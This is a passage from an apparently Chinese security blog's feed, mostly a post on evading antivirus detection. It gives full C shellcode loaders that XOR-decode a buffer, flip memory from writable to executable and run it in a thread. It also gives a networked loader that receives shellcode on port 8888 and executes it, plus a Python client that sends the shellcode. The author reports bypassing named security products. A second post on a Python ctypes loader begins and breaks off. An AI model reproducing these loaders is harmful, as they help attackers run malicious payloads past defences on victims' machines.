class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>DWORD dwOldProtect;<br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    buf[i] ^= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//申请的内存只需要可读可写。</span><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE<br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">//将文件的属性改为可执行</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br>    <br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功上线：</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/4.png"></p><p>绕过某安全软件。</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/3.png"></p><p>杀毒没有查出。</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/8.png"></p><p>但在windows自带的防火墙<code>windows defender</code>给杀了。</p><h3 id="4-利用windows的异或运算API-内存申请优化尝试"><a href="#4-利用windows的异或运算API-内存申请优化尝试" class="headerlink" title="4.利用windows的异或运算API+内存申请优化尝试"></a>4.利用windows的异或运算API+内存申请优化尝试</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinBase.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>    DWORD dwOldProtect; <span class="hljs-comment">// 内存页属性</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br><span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    <span class="hljs-comment">//Sleep(50);</span><br>    _InterlockedXor8(buf+i,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br><span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br><br><span class="hljs-comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span><br><span class="hljs-comment">//Sleep(2000);</span><br><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以绕过许多安全防护（火和60）软件，但还是逃不过<code>windows defender</code>。。。。。。。</p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/6.png"></p><h2 id="4-分离-正向"><a href="#4-分离-正向" class="headerlink" title="4.分离-正向"></a>4.分离-正向</h2><p>​    这边分离的意思就是<code>shellcode</code>和加载器的分离。将其分成两个部分，将加载器程序作为服务端，将<code>shellcode</code>程序作为客户端，当服务端运行后，客户端可以远程将<code>shellcode</code>传入服务端执行。</p><p>服务端：</p><p>​    一开始本来要用写一个<code>RunCode</code>方法来封装申请内存、复制shellcode进内存、创建线程等操作的。但是发现火啥安全软件会直接杀掉，因此放弃。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><span class="hljs-comment">/*写如下函数封装会被火啥安全软件直接杀掉。。。。。</span><br><span class="hljs-comment">BOOL CODE_EXECUTE(CHAR * code,int shellcode_size)</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    HANDLE hThread;</span><br><span class="hljs-comment">    DWORD dwOldProtect;</span><br><span class="hljs-comment">    DWORD dwThreadId;</span><br><span class="hljs-comment">    char* shellcode = (char* )VirtualAlloc(NULL,shellcode_size,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="hljs-comment">    CopyMemory(shellcode,code,shellcode_size);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    // 这里开始更改它的属性为可执行</span><br><span class="hljs-comment">        VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="hljs-comment">        // 执行Shellcode</span><br><span class="hljs-comment">        hThread = CreateThread(</span><br><span class="hljs-comment">            NULL, // 安全描述符</span><br><span class="hljs-comment">            NULL, // 栈的大小</span><br><span class="hljs-comment">            (LPTHREAD_START_ROUTINE)shellcode, // 函数</span><br><span class="hljs-comment">            NULL, // 参数</span><br><span class="hljs-comment">            NULL, // 线程标志</span><br><span class="hljs-comment">            &amp;dwThreadId // 线程ID</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="hljs-comment">        return TRUE;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, TCHAR argv[])</span></span>&#123;<br>    CHAR buf[<span class="hljs-number">801</span>];<br>    DWORD dwError;<br>    WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    SOCKET socks;<br>    SOCKET sClient;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>    INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>    SHORT sListenPort = <span class="hljs-number">8888</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br>    <span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br>    <span class="hljs-keyword">if</span> (socks == INVALID_SOCKET)<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br>    <span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;<br><br>    <span class="hljs-keyword">if</span>(bind(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>)) == SOCKET_ERROR )<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (listen(socks, <span class="hljs-number">5</span>) == SOCKET_ERROR)<br>    &#123;<br>        dwError = GetLastError();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Listen  Error : %d \n&quot;</span>,dwError);<br>        <span class="hljs-keyword">return</span> dwError;<br>    &#125;<br><br>    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);<br>    <span class="hljs-keyword">int</span> ret = recv(sClient,buf,<span class="hljs-keyword">sizeof</span>(buf),<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Recv %d-Bytes \n&quot;</span>,ret);<br>        closesocket(sClient);<br>        closesocket(socks);<br>    &#125;<br><br>    WSACleanup();<br><br>    <span class="hljs-comment">//CODE_EXECUTE(buf,sizeof(buf));</span><br><span class="hljs-comment">//以下是执行shellcode的区域</span><br>    HANDLE hThread;<br>    DWORD dwOldProtect;<br>    DWORD dwThreadId;<br><span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-keyword">char</span>* shellcode = (<span class="hljs-keyword">char</span>* )VirtualAlloc(<span class="hljs-literal">NULL</span>,shellcode_size,MEM_COMMIT,PAGE_READWRITE);<br>    CopyMemory(shellcode,buf,shellcode_size);<br><br>    <span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>        VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>        hThread = CreateThread(<br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>            (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>            <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>            &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>        );<br>        WaitForSingleObject(hThread,INFINITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    服务端并没有被360给杀掉，但是火*会报警。</p><p>​    将以上的代码进行优化后：</p><p>就可以绕过火*了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, TCHAR argv[])</span></span>&#123;<br>    CHAR buf[<span class="hljs-number">801</span>];<br>    DWORD dwError;<br>    WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    SOCKET socks;<br>    SOCKET sClient;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">s_client</span>;</span><br>    INT nAddrLen = <span class="hljs-keyword">sizeof</span>(s_client);<br>    SHORT sListenPort = <span class="hljs-number">8888</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br>WSAStartup(sockVersion, &amp;wsaData);<br><br><br>    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br>    <span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;<br>bind(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>));<br>listen(socks, <span class="hljs-number">5</span>);<br><br>    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);<br>    <span class="hljs-keyword">int</span> ret = recv(sClient,buf,<span class="hljs-keyword">sizeof</span>(buf),<span class="hljs-number">0</span>);<br>closesocket(sClient);<br>    closesocket(socks);<br>    WSACleanup();<br>    HANDLE hThread;<br>    DWORD dwOldProtect;<br>    DWORD dwThreadId;<br><span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br>    <span class="hljs-keyword">char</span>* shellcode = (<span class="hljs-keyword">char</span>* )VirtualAlloc(<span class="hljs-literal">NULL</span>,shellcode_size,MEM_COMMIT,PAGE_READWRITE);<br>    CopyMemory(shellcode,buf,shellcode_size);<br><br>    <span class="hljs-comment">// 这里开始更改它的属性为可执行</span><br>    VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>    hThread = CreateThread(<br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>          (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>          <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>          &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>     );<br>    WaitForSingleObject(hThread,INFINITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端：攻击者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,sys<br><br>Host = <span class="hljs-string">&quot;192.168.199.122&quot;</span><br>Port = <span class="hljs-number">8888</span><br>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br><span class="hljs-keyword">try</span>:<br>    s.connect((Host,Port))<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    print(e)<br>    sys.exit()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    shellcode = <span class="hljs-string">b&#x27;&#x27;</span><br>    s.send(shellcode)<br>    data = s.recv(<span class="hljs-number">1024</span>)<br>    data = data.decode()<br>    print(<span class="hljs-string">&quot;Server say:&quot;</span>,data)<br>s.close()<br></code></pre></td></tr></table></figure><p>​    </p><p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/11.png"></p><p>但还是不能逃过被<code>windows defender</code>的查杀，一开始执行没有事情。但是只要客户端传入<code>shellcode</code>并开始执行的话，就会报警。</p><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a href="https://mp.weixin.qq.com/s/nXrXjvkMtVzkkIIIXfd70w">https://mp.weixin.qq.com/s/nXrXjvkMtVzkkIIIXfd70w</a></p><p><a href="https://idiotc4t.com/defense-evasion/simple-separate-bypassav">https://idiotc4t.com/defense-evasion/simple-separate-bypassav</a></p><p><a href="https://payloads.online/">https://payloads.online/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    上次用Python写了一个shellcode加载器后，对免杀有了很大的兴趣，因此想要再多学习一些。&lt;/p&gt;
&lt;h1</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Shellcode加载器实现-Python</title>
    <link href="https://reader-l.github.io/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/"/>
    <id>https://reader-l.github.io/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/</id>
    <published>2021-03-18T10:18:22.000Z</published>
    <updated>2021-03-19T09:06:21.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    突然想学学python是如何加载shellcode的。</p><h1 id="2-代码"><a href="#2-代码" class="headerlink" title="2.代码"></a>2.代码</h1><p>​    利用ctypes库来调用windows api来完成加载shellcode的操作。</p><h2 id="一些函数的详细信息："><a href="#一些函数的详细信息：" class="headerlink" title="一些函数的详细信息："></a><strong>一些函数的详细信息：</strong></h2><h3 id="1-RtlMoveMemory"><a href="#1-RtlMoveMemory" class="headerlink" title="1.RtlMoveMemory"></a>1.RtlMoveMemory</h3><p>​    调用RtlMoveMemory函数可以将shellcode载入内存，此函数从指定内存中复制内容至另一内存里。RtlMoveMemory函数原型和参数如下:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">RtlMoveMemory(Destination,Source,<span class="hljs-built_in">Length</span>);<br>Destination ：指向移动目的地址的指针。<br>Source ：指向要复制的内存地址的指针。<br><span class="hljs-built_in">Length</span> ：指定要复制的字节数。<br></code></pre></td></tr></table></figure><p>从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">buf = (ctypes.c_char<span class="hljs-operator"> * </span>len(shellcode)).from<span class="hljs-constructor">_buffer(<span class="hljs-params">shellcode</span>)</span><br>ctypes.windll.kernel32.<span class="hljs-constructor">RtlMoveMemory(<span class="hljs-params">ctypes</span>.<span class="hljs-params">c_int</span>(<span class="hljs-params">ptr</span>)</span>,<br>buf,                                     <br>ctypes.c<span class="hljs-constructor">_int(<span class="hljs-params">len</span>(<span class="hljs-params">shellcode</span>)</span>))<br></code></pre></td></tr></table></figure><h3 id="2-CreateThread"><a href="#2-CreateThread" class="headerlink" title="2.CreateThread"></a>2.CreateThread</h3><p>​    创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread函数原型和参数如下：</p><figure class="highlight nginx"><table><tr><td 